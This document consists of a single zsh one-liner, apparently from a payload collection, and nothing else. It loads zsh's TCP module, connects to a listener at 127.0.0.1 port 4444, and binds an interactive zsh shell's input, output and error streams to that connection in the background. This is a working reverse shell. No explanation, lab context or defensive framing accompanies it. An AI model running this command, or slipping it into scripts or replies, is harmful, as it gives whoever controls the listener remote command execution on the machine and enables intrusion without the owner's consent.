zmodload zsh/net/tcp && ztcp 127.0.0.1 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY &
